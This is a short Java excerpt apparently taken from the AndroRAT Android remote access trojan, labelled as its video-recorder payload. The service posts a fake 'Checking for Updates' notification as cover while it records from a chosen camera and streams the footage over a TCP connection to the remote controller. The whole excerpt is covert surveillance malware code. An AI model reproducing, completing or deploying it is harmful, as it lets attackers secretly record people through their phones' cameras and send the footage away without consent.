// https://github.com/karma9874/AndroRAT/tree/1516f5e6cad261db33f7f5bb074377de72cc6d94/Android_Code/app/src/main/java/com/example/reverseshell2/Payloads/videoRecorder.java#L47-L69
public class TempClass {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        String ins = intent.getStringExtra("ins");
        if(ins.equals("startFore")){

            new functions(null).createNotiChannel(getApplicationContext());
            Notification notification = new NotificationCompat.Builder(getApplicationContext(),"channelid")
                    .setContentTitle("Checking for Updates")
                    .setContentText("Fetching")
                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                    .setProgress(0,0,true)
                    .build();
            startForeground(1234, notification);
            String id = intent.getStringExtra("cameraid");
            startVideo(Integer.parseInt(id),tcpConnection.out);
        }
        if(ins.equals("stopFore")){

            videoStop(tcpConnection.out);
        }
        return START_STICKY;
    }

}